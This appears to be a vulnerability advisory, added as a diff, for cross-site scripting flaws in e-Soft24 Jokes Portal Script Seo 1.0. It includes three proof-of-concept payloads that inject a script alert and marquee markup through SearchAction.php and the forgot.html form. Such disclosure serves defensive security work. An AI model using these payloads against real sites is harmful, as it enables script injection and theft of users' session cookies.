@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/43303/info
+
+e-Soft24 Jokes Portal Script Seo is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+e-Soft24 Jokes Portal Script Seo 1.0 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/SearchAction.php?what='"><SCRIPT>alert(String.fromCharCode(88%2C83%2C83))<%2FSCRIPT><MARQUEE+BGCOLOR%3D"RED"><H1>Xss<%2FH1><%2FMARQUEE>&ssub=GO
+
+http://www.example.com/forgot.html => put : '"><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><MARQUEE BGCOLOR="RED"><H1>Xss</H1></MARQUEE>
+			
+http://www.example.com/scripts/jokes-portal/SearchAction.php?what=%27%22%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3CMARQUEE+BGCOLOR%3D%22RED%22%3E%3CH1%3EXss%3C%2FH1%3E%3C%2FMARQUEE%3E&ssub=GO
+
